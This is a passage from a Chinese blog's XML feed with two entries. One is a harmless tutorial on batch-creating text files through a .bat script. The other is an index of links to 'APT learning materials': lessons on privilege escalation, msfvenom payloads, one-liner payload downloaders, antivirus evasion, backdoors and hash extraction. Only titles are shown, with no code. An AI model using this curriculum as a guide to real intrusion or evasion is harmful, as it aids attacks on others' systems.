      
      <category>2021杭电ACM-LCY算法培训进阶班</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>实现批量生成文本/文件等</title>
    <link href="/2021/03/07/%E6%89%B9%E9%87%8F%E7%94%9F%E6%88%90%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B6/"/>
    <url>/2021/03/07/%E6%89%B9%E9%87%8F%E7%94%9F%E6%88%90%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>在工作或者生活中，可能会遇见需要批量生成一些文本或者文件夹的情况，今天以批量生成txt文本为例，教大家怎么批量新建文档的技巧。同样适用于创建其他文本或文档等。</p><h2 id="方法-步骤"><a href="#方法-步骤" class="headerlink" title="方法/步骤"></a>方法/步骤</h2><h3 id="1-第一步"><a href="#1-第一步" class="headerlink" title="1.第一步"></a>1.第一步</h3><figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake">首先在C盘任意的地方新建一个文件夹或文本，比如在桌面新建一个txt文本，名称任意起就行了。<br>这里以建一个 <span class="hljs-keyword">test</span>.txt 文本为例。<br></code></pre></div></td></tr></table></figure><h3 id="2-第二步"><a href="#2-第二步" class="headerlink" title="2.第二步"></a>2.第二步</h3><figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm">打开office工具中的Excel表格文件，在任意中输入 <span class="hljs-keyword">c</span>:&gt;<span class="hljs-number">1</span>.txt <br></code></pre></div></td></tr></table></figure><p><strong>注意：在C盘建的输 c:&gt;1.txt ，如果是在其他盘则写其他盘，如在D盘：d:&gt;1.txt</strong></p><h3 id="3-第三步"><a href="#3-第三步" class="headerlink" title="3.第三步"></a>3.第三步</h3><figure class="highlight gcode"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gcode">让向下填充任意<span class="hljs-comment">(这里以生成20个文本为例)</span>，直接往下拉就行了，然后选择填充序列。<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210407220650162.png"></p><h3 id="4-第四步"><a href="#4-第四步" class="headerlink" title="4.第四步"></a>4.第四步</h3><figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake">然后把刚才弄好的序列，复制到 <span class="hljs-keyword">test</span>.txt 里面.<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210407221114533.png"></p><h3 id="5-第五步"><a href="#5-第五步" class="headerlink" title="5.第五步"></a>5.第五步</h3><figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake">修改 <span class="hljs-keyword">test</span>.txt 文本的后缀为 bat ,即改为 <span class="hljs-keyword">test</span>.bat<br>如果看不见文本的后缀，需要开启显示后缀。可自行百度。<br></code></pre></div></td></tr></table></figure><h3 id="6-第六步"><a href="#6-第六步" class="headerlink" title="6.第六步"></a>6.第六步</h3><figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake">双击 <span class="hljs-keyword">test</span>.bat 即可看见生成了对应数量的文本。<br></code></pre></div></td></tr></table></figure><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs plain">不一定要在excel表格中去弄，这样只是方便些。<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>实用小技能</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>APT学习资料库</title>
    <link href="/2021/03/07/APT%E8%B5%84%E6%96%99%E4%B8%8B%E8%BD%BD/"/>
    <url>/2021/03/07/APT%E8%B5%84%E6%96%99%E4%B8%8B%E8%BD%BD/</url>
    
    <content type="html"><![CDATA[<p>APT相关的学习资料下载。</p><h2 id="资料下载目录"><a href="#资料下载目录" class="headerlink" title="资料下载目录"></a>资料下载目录</h2><h3 id="1-windows提权-快速查找exp"><a href="#1-windows提权-快速查找exp" class="headerlink" title="1.windows提权-快速查找exp"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/windows%E6%8F%90%E6%9D%83-%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BEexp%EF%BC%88%E7%AC%AC%E4%B8%80%E8%AF%BE%EF%BC%89.docx">1.windows提权-快速查找exp</a></h3><h3 id="2-Linux提权-依赖exp篇"><a href="#2-Linux提权-依赖exp篇" class="headerlink" title="2.Linux提权-依赖exp篇"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/Linux%E6%8F%90%E6%9D%83-%E4%BE%9D%E8%B5%96exp%E7%AF%87%20%EF%BC%88%E7%AC%AC%E4%BA%8C%E8%AF%BE%EF%BC%89.docx">2.Linux提权-依赖exp篇</a></h3><h3 id="5-工具介绍-Sqlmap"><a href="#5-工具介绍-Sqlmap" class="headerlink" title="5.工具介绍-Sqlmap"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D-Sqlmap%EF%BC%88%E7%AC%AC%E4%BA%94%E8%AF%BE%EF%BC%89.docx">5.工具介绍-Sqlmap</a></h3><h3 id="6-反攻的一次溯源–项目实战3"><a href="#6-反攻的一次溯源–项目实战3" class="headerlink" title="6.反攻的一次溯源–项目实战3"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%8F%8D%E6%94%BB%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BA%AF%E6%BA%90--%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%983%EF%BC%88%E7%AC%AC%E5%85%AD%E8%AF%BE%EF%BC%89.docx">6.反攻的一次溯源–项目实战3</a></h3><h3 id="7-sql-server-常用操作远程桌面语句"><a href="#7-sql-server-常用操作远程桌面语句" class="headerlink" title="7.sql server 常用操作远程桌面语句"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/sql%20server%20%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%AF%AD%E5%8F%A5%EF%BC%88%E7%AC%AC%E4%B8%83%E8%AF%BE%EF%BC%89.docx">7.sql server 常用操作远程桌面语句</a></h3><h3 id="8-模拟诉求任务攻击"><a href="#8-模拟诉求任务攻击" class="headerlink" title="8.模拟诉求任务攻击"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E6%A8%A1%E6%8B%9F%E8%AF%89%E6%B1%82%E4%BB%BB%E5%8A%A1%E6%94%BB%E5%87%BB%EF%BC%88%E7%AC%AC%E5%85%AB%E8%AF%BE%EF%BC%89.docx">8.模拟诉求任务攻击</a></h3><h3 id="9-工具介绍-the-backdoor-factory"><a href="#9-工具介绍-the-backdoor-factory" class="headerlink" title="9.工具介绍-the-backdoor-factory"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D-the-backdoor-factory%EF%BC%88%E7%AC%AC%E4%B9%9D%E8%AF%BE%EF%BC%89.docx">9.工具介绍-the-backdoor-factory</a></h3><h3 id="10-msfvenom常用生成payload命令"><a href="#10-msfvenom常用生成payload命令" class="headerlink" title="10.msfvenom常用生成payload命令"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/msfvenom%E5%B8%B8%E7%94%A8%E7%94%9F%E6%88%90payload%E5%91%BD%E4%BB%A4%EF%BC%88%E7%AC%AC%E5%8D%81%E8%AF%BE%EF%BC%89.docx">10.msfvenom常用生成payload命令</a></h3><h3 id="11-工具介绍Veil-Evasion"><a href="#11-工具介绍Veil-Evasion" class="headerlink" title="11.工具介绍Veil-Evasion"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8DVeil-Evasion%EF%BC%88%E7%AC%AC%E5%8D%81%E4%B8%80%E8%AF%BE%EF%BC%89.docx">11.工具介绍Veil-Evasion</a></h3><h3 id="12-基于UDP发现内网存活主机"><a href="#12-基于UDP发现内网存活主机" class="headerlink" title="12.基于UDP发现内网存活主机"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%9F%BA%E4%BA%8EUDP%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%EF%BC%88%E7%AC%AC%E5%8D%81%E4%BA%8C%E8%AF%BE%EF%BC%89.docx">12.基于UDP发现内网存活主机</a></h3><h3 id="13-基于ARP发现内网存活主机"><a href="#13-基于ARP发现内网存活主机" class="headerlink" title="13.基于ARP发现内网存活主机"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%9F%BA%E4%BA%8EARP%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%EF%BC%88%E7%AC%AC%E5%8D%81%E4%B8%89%E8%AF%BE%EF%BC%89.docx">13.基于ARP发现内网存活主机</a></h3><h3 id="14-基于第十课补充payload1"><a href="#14-基于第十课补充payload1" class="headerlink" title="14.基于第十课补充payload1"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%9F%BA%E4%BA%8E%E7%AC%AC%E5%8D%81%E8%AF%BE%E8%A1%A5%E5%85%85payload1%EF%BC%88%E7%AC%AC%E5%8D%81%E5%9B%9B%E8%AF%BE%EF%BC%89.docx">14.基于第十课补充payload1</a></h3><h3 id="15-基于第十课补充payload2"><a href="#15-基于第十课补充payload2" class="headerlink" title="15.基于第十课补充payload2"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%9F%BA%E4%BA%8E%E7%AC%AC%E5%8D%81%E8%AF%BE%E8%A1%A5%E5%85%85payload2%EF%BC%88%E7%AC%AC%E5%8D%81%E4%BA%94%E8%AF%BE%EF%BC%89.docx">15.基于第十课补充payload2</a></h3><h3 id="16-红蓝对抗渗透测试1"><a href="#16-红蓝对抗渗透测试1" class="headerlink" title="16.红蓝对抗渗透测试1"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951%EF%BC%88%E7%AC%AC%E5%8D%81%E5%85%AD%E8%AF%BE%EF%BC%89.docx">16.红蓝对抗渗透测试1</a></h3><h3 id="17-红蓝对抗渗透测试2"><a href="#17-红蓝对抗渗透测试2" class="headerlink" title="17.红蓝对抗渗透测试2"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%952%EF%BC%88%E7%AC%AC%E5%8D%81%E4%B8%83%E8%AF%BE%EF%BC%89.docx">17.红蓝对抗渗透测试2</a></h3><h3 id="18-红蓝对抗渗透测试3"><a href="#18-红蓝对抗渗透测试3" class="headerlink" title="18.红蓝对抗渗透测试3"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E7%AC%AC%E5%8D%81%E5%85%AB%E8%AF%BE%EF%BC%9A%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953.docx">18.红蓝对抗渗透测试3</a></h3><h3 id="19-基于netbios发现内网存活主机"><a href="#19-基于netbios发现内网存活主机" class="headerlink" title="19.基于netbios发现内网存活主机"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%9F%BA%E4%BA%8Enetbios%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%EF%BC%88%E7%AC%AC%E5%8D%81%E4%B9%9D%E8%AF%BE%EF%BC%89.docx">19.基于netbios发现内网存活主机</a></h3><h3 id="20-基于snmp发现内网存活主机"><a href="#20-基于snmp发现内网存活主机" class="headerlink" title="20.基于snmp发现内网存活主机"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%9F%BA%E4%BA%8Esnmp%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%EF%BC%88%E7%AC%AC%E4%BA%8C%E5%8D%81%E8%AF%BE%EF%BC%89.docx">20.基于snmp发现内网存活主机</a></h3><h3 id="31-msf的前生今世"><a href="#31-msf的前生今世" class="headerlink" title="31.msf的前生今世"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/msf%E7%9A%84%E5%89%8D%E7%94%9F%E4%BB%8A%E4%B8%96%EF%BC%88%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E8%AF%BE%EF%BC%89.docx">31.msf的前生今世</a></h3><h3 id="32-配置vps上的msf"><a href="#32-配置vps上的msf" class="headerlink" title="32.配置vps上的msf"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E9%85%8D%E7%BD%AEvps%E4%B8%8A%E7%9A%84msf%EF%BC%88%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E8%AF%BE%EF%BC%89.docx">32.配置vps上的msf</a></h3><h3 id="33-攻击Mysql服务"><a href="#33-攻击Mysql服务" class="headerlink" title="33.攻击Mysql服务"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E6%94%BB%E5%87%BBMysql%E6%9C%8D%E5%8A%A1%EF%BC%88%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E8%AF%BE%EF%BC%89.docx">33.攻击Mysql服务</a></h3><h3 id="34-攻击Sql-server-服务"><a href="#34-攻击Sql-server-服务" class="headerlink" title="34.攻击Sql server 服务"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E6%94%BB%E5%87%BBSql%20server%20%E6%9C%8D%E5%8A%A1%EF%BC%88%E7%AC%AC%E4%B8%89%E5%8D%81%E5%9B%9B%E8%AF%BE%EF%BC%89.docx">34.攻击Sql server 服务</a></h3><h3 id="35-与Sqlmap结合攻击"><a href="#35-与Sqlmap结合攻击" class="headerlink" title="35.与Sqlmap结合攻击"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E4%B8%8ESqlmap%E7%BB%93%E5%90%88%E6%94%BB%E5%87%BB%EF%BC%88%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E8%AF%BE%EF%BC%89.docx">35.与Sqlmap结合攻击</a></h3><h3 id="36-解决vps上ssh掉线"><a href="#36-解决vps上ssh掉线" class="headerlink" title="36.解决vps上ssh掉线"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E8%A7%A3%E5%86%B3vps%E4%B8%8Assh%E6%8E%89%E7%BA%BF%EF%BC%88%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AD%E8%AF%BE%EF%BC%89.docx">36.解决vps上ssh掉线</a></h3><h3 id="37-vbs一句话下载payload"><a href="#37-vbs一句话下载payload" class="headerlink" title="37.vbs一句话下载payload"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/vbs%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%EF%BC%88%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E8%AF%BE%EF%BC%89.docx">37.vbs一句话下载payload</a></h3><h3 id="38-certutil一句话下载payload"><a href="#38-certutil一句话下载payload" class="headerlink" title="38.certutil一句话下载payload"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/certutil%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%EF%BC%88%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AB%E8%AF%BE%EF%BC%89.docx">38.certutil一句话下载payload</a></h3><h3 id="39-vbs一句话下载payload补充"><a href="#39-vbs一句话下载payload补充" class="headerlink" title="39.vbs一句话下载payload补充"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/vbs%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%E8%A1%A5%E5%85%85%EF%BC%88%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B9%9D%E8%AF%BE%EF%BC%89.docx">39.vbs一句话下载payload补充</a></h3><h3 id="40-ftp一句话下载payload"><a href="#40-ftp一句话下载payload" class="headerlink" title="40.ftp一句话下载payload"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/ftp%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%EF%BC%88%E7%AC%AC%E5%9B%9B%E5%8D%81%E8%AF%BE%EF%BC%89.docx">40.ftp一句话下载payload</a></h3><h3 id="41-bitsadmin一句话下载payload"><a href="#41-bitsadmin一句话下载payload" class="headerlink" title=" 41.bitsadmin一句话下载payload"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/bitsadmin%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%EF%BC%88%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%80%E8%AF%BE%EF%BC%89.docx"> 41.bitsadmin一句话下载payload</a></h3><h3 id="42-攻击FTP-服务"><a href="#42-攻击FTP-服务" class="headerlink" title="42.攻击FTP 服务"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E6%94%BB%E5%87%BBFTP%20%E6%9C%8D%E5%8A%A1%EF%BC%88%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E8%AF%BE%EF%BC%89.docx">42.攻击FTP 服务</a></h3><h3 id="43-js一句话下载payload"><a href="#43-js一句话下载payload" class="headerlink" title=" 43.js一句话下载payload"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/js%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%EF%BC%88%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E8%AF%BE%EF%BC%89.docx"> 43.js一句话下载payload</a></h3><h3 id="44-ertutil一句话下载payload补充"><a href="#44-ertutil一句话下载payload补充" class="headerlink" title="44.ertutil一句话下载payload补充"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/ertutil%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%E8%A1%A5%E5%85%85%EF%BC%88%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E8%AF%BE%EF%BC%89.docx">44.ertutil一句话下载payload补充</a></h3><h3 id="45-解决bat一句话下载payload黑窗"><a href="#45-解决bat一句话下载payload黑窗" class="headerlink" title="45.解决bat一句话下载payload黑窗"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E8%A7%A3%E5%86%B3bat%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%E9%BB%91%E7%AA%97%EF%BC%88%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%94%E8%AF%BE%EF%BC%89.docx">45.解决bat一句话下载payload黑窗</a></h3><h3 id="46-powershell一句话下载payload"><a href="#46-powershell一句话下载payload" class="headerlink" title="46.powershell一句话下载payload"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/powershell%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%EF%BC%88%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AD%E8%AF%BE%EF%BC%89.docx">46.powershell一句话下载payload</a></h3><h3 id="47-payload分离免杀思路"><a href="#47-payload分离免杀思路" class="headerlink" title="47.payload分离免杀思路"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/payload%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%EF%BC%88%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E8%AF%BE%EF%BC%89.docx">47.payload分离免杀思路</a></h3><h3 id="48-payload分离免杀思路第二季"><a href="#48-payload分离免杀思路第二季" class="headerlink" title="48.payload分离免杀思路第二季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/payload%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E7%AC%AC%E4%BA%8C%E5%AD%A3%EF%BC%88%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AB%E8%AF%BE%EF%BC%89.docx">48.payload分离免杀思路第二季</a></h3><h3 id="49-关于Powershell对抗安全软件"><a href="#49-关于Powershell对抗安全软件" class="headerlink" title="49.关于Powershell对抗安全软件"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%85%B3%E4%BA%8EPowershell%E5%AF%B9%E6%8A%97%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%EF%BC%88%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E8%AF%BE%EF%BC%89.docx">49.关于Powershell对抗安全软件</a></h3><h3 id="50-基于SqlDataSourceEnumerator发现内网存活主机"><a href="#50-基于SqlDataSourceEnumerator发现内网存活主机" class="headerlink" title="50.基于SqlDataSourceEnumerator发现内网存活主机"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%9F%BA%E4%BA%8ESqlDataSourceEnumerator%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E8%AF%BE%EF%BC%89%EF%BC%89.docx">50.基于SqlDataSourceEnumerator发现内网存活主机</a></h3><h3 id="51-项目回忆：体系的本质是知识点串联"><a href="#51-项目回忆：体系的本质是知识点串联" class="headerlink" title="51.项目回忆：体系的本质是知识点串联"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E9%A1%B9%E7%9B%AE%E5%9B%9E%E5%BF%86%EF%BC%9A%E4%BD%93%E7%B3%BB%E7%9A%84%E6%9C%AC%E8%B4%A8%E6%98%AF%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B8%B2%E8%81%94%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%80%E8%AF%BE%EF%BC%89.docx">51.项目回忆：体系的本质是知识点串联</a></h3><h3 id="52-渗透的本质是信息搜集"><a href="#52-渗透的本质是信息搜集" class="headerlink" title="52.渗透的本质是信息搜集"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E6%B8%97%E9%80%8F%E7%9A%84%E6%9C%AC%E8%B4%A8%E6%98%AF%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%8C%E8%AF%BE%EF%BC%89%EF%BC%89.docx">52.渗透的本质是信息搜集</a></h3><h3 id="53-内网渗透中的文件传输"><a href="#53-内网渗透中的文件传输" class="headerlink" title="53.内网渗透中的文件传输"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%89%E8%AF%BE%EF%BC%89.docx">53.内网渗透中的文件传输</a></h3><h3 id="54-基于Powershell做Socks-4-5代理"><a href="#54-基于Powershell做Socks-4-5代理" class="headerlink" title="54.基于Powershell做Socks 4-5代理"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%9F%BA%E4%BA%8EPowershell%E5%81%9ASocks%204-5%E4%BB%A3%E7%90%86%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E5%9B%9B%E8%AF%BE%EF%BC%89.docx">54.基于Powershell做Socks 4-5代理</a></h3><h3 id="55-与Smbmap结合攻击"><a href="#55-与Smbmap结合攻击" class="headerlink" title="55.与Smbmap结合攻击"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E4%B8%8ESmbmap%E7%BB%93%E5%90%88%E6%94%BB%E5%87%BB%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%94%E8%AF%BE%EF%BC%89.docx">55.与Smbmap结合攻击</a></h3><h3 id="56-离线提取目标机hash"><a href="#56-离线提取目标机hash" class="headerlink" title="56.离线提取目标机hash"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E7%A6%BB%E7%BA%BF%E6%8F%90%E5%8F%96%E7%9B%AE%E6%A0%87%E6%9C%BAhash%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%AD%E8%AF%BE%EF%BC%89.docx">56.离线提取目标机hash</a></h3><h3 id="57-高级持续渗透-第一季关于后门"><a href="#57-高级持续渗透-第一季关于后门" class="headerlink" title="57.高级持续渗透-第一季关于后门"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E4%B8%80%E5%AD%A3%E5%85%B3%E4%BA%8E%E5%90%8E%E9%97%A8%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%83%E8%AF%BE%EF%BC%89.docx">57.高级持续渗透-第一季关于后门</a></h3><h3 id="58-高级持续渗透-第二季关于后门补充一"><a href="#58-高级持续渗透-第二季关于后门补充一" class="headerlink" title="58.高级持续渗透-第二季关于后门补充一"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E4%BA%8C%E5%AD%A3%E5%85%B3%E4%BA%8E%E5%90%8E%E9%97%A8%E8%A1%A5%E5%85%85%E4%B8%80%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%AB%E8%AF%BE%EF%BC%89.docx">58.高级持续渗透-第二季关于后门补充一</a></h3><h3 id="59-高级持续渗透-第三季关于后门补充二"><a href="#59-高级持续渗透-第三季关于后门补充二" class="headerlink" title="59.高级持续渗透-第三季关于后门补充二"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E4%B8%89%E5%AD%A3%E5%85%B3%E4%BA%8E%E5%90%8E%E9%97%A8%E8%A1%A5%E5%85%85%E4%BA%8C%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B9%9D%E8%AF%BE%EF%BC%89.docx">59.高级持续渗透-第三季关于后门补充二</a></h3><h3 id="60-高级持续渗透-第四季关于后门"><a href="#60-高级持续渗透-第四季关于后门" class="headerlink" title="60.高级持续渗透-第四季关于后门"></a><a 